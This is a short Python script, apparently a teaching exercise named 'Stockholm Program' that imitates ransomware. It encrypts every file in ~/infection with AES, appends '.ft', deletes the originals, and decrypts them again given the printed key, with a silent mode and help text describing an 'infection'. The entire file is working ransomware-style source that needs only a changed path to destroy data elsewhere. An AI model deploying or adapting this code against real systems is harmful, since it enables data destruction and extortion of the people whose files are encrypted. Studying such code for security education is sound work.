#!/usr/bin/env python3
import os
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
VERSION = "Stockholm Program v1.0"
INFECTION_DIR = os.path.expanduser('~/infection')
BLOCK_SIZE = AES.block_size


# Encrypt file
def encrypt_file(file_path, key, silent=False):
    try:
        cipher = AES.new(key, AES.MODE_CBC)
        with open(file_path, 'rb') as f:
            data = f.read()
        ciphertext = cipher.encrypt(pad(data, BLOCK_SIZE))
        encrypted_path = file_path + '.ft'
        with open(encrypted_path, 'wb') as f:
            f.write(cipher.iv)
            f.write(ciphertext)
        os.remove(file_path)
        if not silent:
            print(f"Encrypted: {file_path}")
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")


# Decrypt file
def decrypt_file(file_path, key, silent=False):
    try:
        with open(file_path, 'rb') as f:
            iv = f.read(16)
            ciphertext = f.read()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(ciphertext), BLOCK_SIZE)
        decrypted_path = file_path[:-3]  # remove .ft
        with open(decrypted_path, 'wb') as f:
            f.write(plaintext)
        os.remove(file_path)
        if not silent:
            print(f"Decrypted: {decrypted_path}")
    except Exception as e:
        print(f"Error decrypting {file_path}: {e}")

# Process directory
def process_files(key, reverse=False, silent=False):
    if not os.path.exists(INFECTION_DIR):
        print(f"Infection directory not found: {INFECTION_DIR}")
        return
    for filename in os.listdir(INFECTION_DIR):
        full_path = os.path.join(INFECTION_DIR, filename)
        if os.path.isfile(full_path):
            if reverse and filename.endswith('.ft'):
                decrypt_file(full_path, key, silent)
            elif not reverse and not filename.endswith('.ft'):
                encrypt_file(full_path, key, silent)

# Command-line interface
def main():
    parser = argparse.ArgumentParser(description="Stockholm Encryption Program", add_help=False)
    parser.add_argument('-h', '--help', action='store_true', help="Show help message")
    parser.add_argument('-v', '--version', action='store_true', help="Show program version")
    parser.add_argument('-r', '--reverse', metavar='KEY', help="Reverse (decrypt) using the provided 32-character hex key")
    parser.add_argument('-s', '--silent', action='store_true', help="Run without output")
    args = parser.parse_args()
    if args.help:
        print("""
Stockholm Program
Usage: ./stockholm.py [options]
Options:
  -h, --help        Show help message
  -v, --version     Show program version
  -r, --reverse     Reverse the infection (decrypt) - requires key
  -s, --silent      Run without output
""")
        return
    if args.version:
        print(VERSION)
        return
    silent = args.silent
    if args.reverse:
        try:
            key_bytes = bytes.fromhex(args.reverse)
            if len(key_bytes) != 16:
                raise ValueError
            process_files(key_bytes, reverse=True, silent=silent)
        except ValueError:
            print("Invalid key format. Key must be a 32-character hex (16 bytes).")
    else:
        # Encrypt mode
        key = os.urandom(16)
        print(f"Encryption key (save this!): {key.hex()}")
        process_files(key, reverse=False, silent=silent)

if __name__ == '__main__':
    main()